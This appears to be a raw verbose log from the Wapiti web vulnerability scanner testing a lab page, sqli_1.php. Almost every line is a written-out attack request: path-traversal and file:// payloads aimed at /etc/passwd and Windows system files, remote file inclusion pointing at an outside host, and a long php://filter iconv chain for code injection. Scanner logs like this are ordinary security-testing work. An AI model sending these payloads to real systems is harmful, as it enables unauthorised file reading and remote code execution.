2024-03-20 16:41:19.405 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:41:22.863 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:41:22.870 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:41:22.877 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:41:22.886 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:41:22.896 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:41:22.906 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
2024-03-20 16:41:22.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:41:22.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:41:22.925 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:41:22.932 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:41:22.938 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:41:22.945 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:41:22.952 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=file%3A%2F%2F%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:41:22.959 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
2024-03-20 16:41:22.966 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&security_level=2
2024-03-20 16:41:22.972 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&security_level=2
2024-03-20 16:41:22.979 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&security_level=2
2024-03-20 16:41:22.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:41:22.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
2024-03-20 16:41:22.999 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
2024-03-20 16:41:23.005 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=sqli_1.php&security_level=2
2024-03-20 16:41:23.013 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=sqli_1.php%00&security_level=2
2024-03-20 16:41:23.019 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=sqli_1.php%3A%3A%24DATA&security_level=2
2024-03-20 16:41:23.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
2024-03-20 16:41:23.034 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
2024-03-20 16:41:23.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd
2024-03-20 16:41:23.048 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd%00
2024-03-20 16:41:23.054 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fservices
2024-03-20 16:41:23.060 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%2Fetc%2Fservices%00
2024-03-20 16:41:23.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
2024-03-20 16:41:23.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
2024-03-20 16:41:23.080 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
2024-03-20 16:41:23.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:41:23.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:41:23.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
2024-03-20 16:41:23.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
2024-03-20 16:41:23.113 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
2024-03-20 16:41:23.120 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:41:23.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:41:23.136 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:41:23.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:41:23.154 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:41:23.165 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:41:23.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:41:23.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:41:23.193 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:41:23.202 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:41:23.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:41:23.222 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:41:23.232 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
2024-03-20 16:41:23.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:41:23.251 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:41:23.259 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:41:23.268 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:41:23.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:41:23.287 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:41:23.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:41:23.307 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:41:23.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:41:23.326 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-20 16:41:23.336 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:41:23.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-20 16:41:23.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:41:23.366 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-20 16:41:23.376 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:41:23.386 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-20 16:41:23.397 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:41:23.406 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-20 16:41:23.415 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-20 16:41:23.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
